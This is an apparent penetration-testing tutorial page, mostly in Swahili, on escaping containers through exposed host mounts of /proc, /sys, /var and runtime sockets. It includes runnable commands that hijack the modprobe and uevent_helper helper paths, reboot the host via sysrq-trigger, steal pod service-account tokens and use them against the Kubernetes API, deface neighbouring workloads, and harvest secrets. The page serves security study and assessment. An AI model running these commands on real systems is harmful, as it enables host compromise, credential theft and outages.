# Mounts Nyeti za Host

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Host mounts ni moja ya uso muhimu zaidi wa vitendo wa container-escape kwa sababu mara nyingi hupelekea mtazamo uliotengwa wa mchakato kurudi kuwa uwazi wa moja kwa moja wa rasilimali za host. Mambo hatari hayako tu kwa `/`. Bind mounts za `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, au njia zinazohusiana na device zinaweza kufunua udhibiti wa kernel, credentials, filesystem za container jirani, na interfaces za usimamizi wa runtime.

Ukurasa huu upo tofauti na kurasa za ulinzi za kila moja kwa moja kwa sababu modeli ya matumizi mabaya inavuka mipaka. Host mount inayoweza kuandikwa ni hatari sehemu kwa sababu ya mount namespaces, sehemu kwa sababu ya user namespaces, sehemu kwa sababu ya AppArmor au SELinux coverage, na sehemu kwa sababu ya ni njia gani sahihi ya host iliyofunuliwa. Kuichukulia kama mada tofauti kunafanya uso wa shambulio kuwa rahisi kufikiri.

## `/proc` Exposure

procfs ina taarifa za kawaida za mchakato na interfaces za udhibiti wa kernel zenye athari kubwa. Bind mount kama `-v /proc:/host/proc` au mtazamo wa container unaofunua entries za proc zisizotarajiwa ambazo zinaweza kuandikwa unaweza kusababisha ufunujaji wa taarifa, kukataa huduma, au utekelezaji wa msimbo kwenye host moja kwa moja.

Njia za procfs zenye thamani kubwa ni pamoja na:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Matumizi Mabaya

Anza kwa kukagua ni entry gani za procfs zenye thamani kubwa zinaonekana au zinaweza kuandikwa:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

Thamani ya vitendo ya kila njia ni tofauti, na kuzitendea zote kana kwamba zina athari sawa kunafanya uchambuzi wa kipaumbele ugumu zaidi:

- `/proc/sys/kernel/core_pattern`
Ikiwa inakaribika kuandikwa, hii ni mojawapo ya njia za procfs zenye athari kubwa kwa sababu kernel itatekeleza pipe handler baada ya crash. Container inayoweza kuonyesha `core_pattern` kwa payload iliyohifadhiwa kwenye overlay yake au kwenye njia iliyopakiwa ya host mara nyingi inaweza kupata host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`
Njia hii inadhibiti userspace helper inayotumika na kernel inapohitaji kupiga module-loading logic. Ikiwa inakaribika kuandikwa kutoka container na kutafsirishwa katika muktadha wa host, inaweza kuwa primitive nyingine ya host code-execution. Inavutia hasa inapochanganywa na njia ya kusababisha helper path.
- `/proc/sys/vm/panic_on_oom`
Hii kwa kawaida si primitive safi ya kutoroka, lakini inaweza kubadilisha msongo wa kumbukumbu kuwa denial-of-service ya host nzima kwa kugeuza OOM conditions kuwa tabia ya kernel panic.
- `/proc/sys/fs/binfmt_misc`
Ikiwa interface ya registration inakaribika kuandikwa, mshambuliaji anaweza kusajili handler kwa magic value iliyochaguliwa na kupata host-context execution wakati faili inayofanana itakapotekelezwa.
- `/proc/config.gz`
Inafaa kwa triage ya kernel exploit. Inasaidia kubaini ni subsystems gani, mitigations, na vipengele vya ziada vya kernel vimewezeshwa bila kuhitaji host package metadata.
- `/proc/sysrq-trigger`
Kwa kawaida ni njia ya denial-of-service, lakini mbaya sana. Inaweza kufanya reboot, panic, au kuingilia host mara moja kwa namna nyingine.
- `/proc/kmsg`
Inaonyesha kernel ring buffer messages. Inafaa kwa host fingerprinting, crash analysis, na katika mazingira fulani kwa leaking information inayosaidia kernel exploitation.
- `/proc/kallsyms`
Ni muhimu inapoweza kusomwa kwa sababu inafichua exported kernel symbol information na inaweza kusaidia kupinga assumptions za address randomization wakati wa kernel exploit development.
- `/proc/[pid]/mem`
Hii ni interface ya moja kwa moja ya process-memory. Ikiwa mchakato lengwa unafikiwa kwa masharti ya aina ya ptrace, inaweza kuruhusu kusoma au kubadilisha kumbukumbu ya mchakato mwingine. Mchango halisi unategemea sana credentials, `hidepid`, Yama, na ptrace restrictions, kwa hivyo ni njia yenye nguvu lakini yenye masharti.
- `/proc/kcore`
Inafichua mtazamo wa core-image-style wa kumbukumbu ya mfumo. Faili ni kubwa na ngumu kutumia, lakini ikiwa inaweza kusomwa kwa maana inaonyesha uso wa kumbukumbu wa host uliotendewa vibaya.
- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/[pid]/mountinfo`
Inafaa sana kwa kujenga upya wapi container kwa kweli iko kwenye host, ni njia gani zinaungwa mkono na overlay, na kama mount inayoweza kuandikwa inalingana na maudhui ya host au tu tabaka la container.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Amri hizi ni muhimu kwa sababu taratibu kadhaa za host-execution zinahitaji kubadilisha path ndani ya container kuwa path inayolingana kutoka kwa mtazamo wa host.

### Mfano Kamili: `modprobe` Helper Path Abuse

Kama `/proc/sys/kernel/modprobe` inaweza kuandikwa kutoka container na helper path inatafsiriwa katika muktadha wa host, inaweza kuelekezwa kwa attacker-controlled payload:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Kichocheo halisi kinategemea lengo na tabia ya kernel, lakini jambo muhimu ni kwamba njia ya helper inayoweza kuandikwa inaweza kuielekeza mwito wa helper wa kernel wa baadaye kwenye maudhui ya host-path yanayotawaliwa na mshambuliaji.

### Mfano Kamili: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Ikiwa lengo ni tathmini ya exploitability badala ya kutoroka papo hapo:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Amri hizi zinasaidia kujibu ikiwa useful symbol information inaonekana, ikiwa recent kernel messages zinafunua state zenye kuvutia, na ni kernel features au mitigations zipi zimecompiled. Athari kwa kawaida si escape moja kwa moja, lakini inaweza kwa kiasi kikubwa kuharakisha kernel-vulnerability triage.

### Mfano Kamili: SysRq Host Reboot

Ikiwa `/proc/sysrq-trigger` inaweza kuandikwa na inafikia mtazamo wa host:
```bash
echo b > /proc/sysrq-trigger
```
Madhara yake ni reboot ya papo hapo ya host. Huu sio mfano mpole, lakini unaonyesha wazi kwamba ufunuo wa procfs unaweza kuwa mbaya zaidi kuliko ufichuzi wa taarifa.

## `/sys` Ufunuliwa

sysfs huonyesha kiasi kikubwa cha hali ya kernel na kifaa. Baadhi ya njia za sysfs zinafaa hasa kwa fingerprinting, wakati nyingine zinaweza kuathiri utekelezaji wa helper, tabia za kifaa, usanidi wa security-module, au hali ya firmware.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Paths hizi zina umuhimu kwa sababu tofauti. `/sys/class/thermal` inaweza kuathiri tabia ya usimamizi wa joto na hivyo ustahimilivu wa host katika mazingira yaliyo wazi vibaya. `/sys/kernel/vmcoreinfo` inaweza leak taarifa za crash-dump na muundo wa kernel ambazo zinaweza kusaidia fingerprinting ya host kwa ngazi ya chini. `/sys/kernel/security` ni interface ya `securityfs` inayotumiwa na Linux Security Modules, hivyo ufikiaji usiotarajiwa huko unaweza kufichua au kubadilisha hali inayohusiana na MAC. EFI variable paths zinaweza kuathiri settings za boot zinazoungwa na firmware, na kuifanya kuwa mbaya zaidi kuliko faili za kawaida za usanidi. `debugfs` chini ya `/sys/kernel/debug` ni hatari sana kwa sababu ni interface iliyolengwa kwa developers na ina matarajio ya usalama mdogo zaidi kuliko API za kernel zilizohifadhiwa kwa ajili ya production.

Amri muhimu za kukagua njia hizi ni:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- /sys/kernel/security may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
- /sys/kernel/debug is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
- /sys/class/thermal is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
- /sys/kernel/vmcoreinfo is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.

### Mfano Kamili: `uevent_helper`

Ikiwa `/sys/kernel/uevent_helper` inaweza kuandikwa, kernel inaweza kutekeleza helper inayodhibitiwa na mshambuliaji wakati `uevent` inapochochewa:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Sababu inayofanya hili lifanye kazi ni kwamba helper path inaeleweka kutoka mtazamo wa host. Mara inapoanzishwa, helper inaendesha katika muktadha wa host badala ya ndani ya container ya sasa.

## `/var` Ufunuo

Kuweka `/var` ya host ndani ya container mara nyingi huchukuliwa chini ya thamani kwa sababu haionekani kuwa ya kushtua kama kuweka `/`. Katika vitendo inaweza kutosha kufikia runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, na neighboring application filesystems. Katika nodes za kisasa, `/var` mara nyingi ndiyo mahali ambapo hali za container zinazovutia kimasuala operesheni zinakaa.

### Mfano wa Kubernetes

Pod yenye `hostPath: /var` mara nyingi inaweza kusoma projected tokens za pod nyingine na maudhui ya overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Amri hizi ni muhimu kwa sababu zinajibu kama mount inafichua tu data ya kawaida ya programu au credentials za cluster zenye athari kubwa. A readable service-account token inaweza mara moja kubadilisha local code execution kuwa upatikanaji wa Kubernetes API.

Iwapo token ipo, thibitisha ni nini inaweza kufikia badala ya kusimama kwa kugundua token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Athari hapa inaweza kuwa kubwa zaidi kuliko upatikanaji wa node ya ndani. token yenye RBAC pana inaweza kugeuza `/var` iliyopangwa kuwa uvunjaji wa usalama wa kiwango cha cluster.

### Docker Na containerd Mfano

Kwenye Docker hosts data husika mara nyingi huwa chini ya `/var/lib/docker`, wakati kwenye Kubernetes nodes zinazotegemea containerd inaweza kuwa chini ya `/var/lib/containerd` au njia maalum za snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Ikiwa mounted `/var` inaonyesha yaliyomo ya snapshot yanayoweza kuandikwa ya workload nyingine, mshambuliaji anaweza kubadilisha mafaili ya programu, kuweka maudhui ya wavuti, au kubadilisha script za kuanzisha bila kugusa usanidi wa container wa sasa.

Mawazo ya matumizi mabaya mara tu yaliyomo ya snapshot yanayoweza kuandikwa yanapopatikana:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Amri hizi ni muhimu kwa sababu zinaonyesha familia tatu kuu za athari za `/var` iliyowekwa: kuingilia programu, kupata siri, na lateral movement ndani ya workloads jirani.

## Soketi za runtime

Mounts nyeti za mwenyeji mara nyingi hujumuisha soketi za runtime badala ya saraka kamili. Hizi ni muhimu sana kiasi kwamba zinastahili kutajwa hapa tena kwa uwazi:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Tazama [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) kwa full exploitation flows mara soketi moja kati ya hizi inapokuwa mounted.

Kama mfano wa haraka wa muingiliano wa kwanza:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## Mount-Related CVEs

Host mounts also intersect with runtime vulnerabilities. Important recent examples include:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.

These CVEs matter here because they show that mount handling is not only about operator configuration. The runtime itself may also introduce mount-driven escape conditions.

## Checks

Tumia hii amri kutafuta wazi kwa haraka exposure za mount zenye thamani kubwa:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Kinachovutia hapa:

- Root ya host, `/proc`, `/sys`, `/var`, na runtime sockets zote ni uvumbuzi zenye kipaumbele cha juu.
- Eintri za `/proc`/`sys` zinazoweza kuandikwa mara nyingi zinaonyesha mount inafichua udhibiti wa kernel wa host nzima badala ya mtazamo salama wa container.
- Mounted `/var` paths zinastahili ukaguzi wa credentials na wa neighboring-workload, si tu ukaguzi wa filesystem.
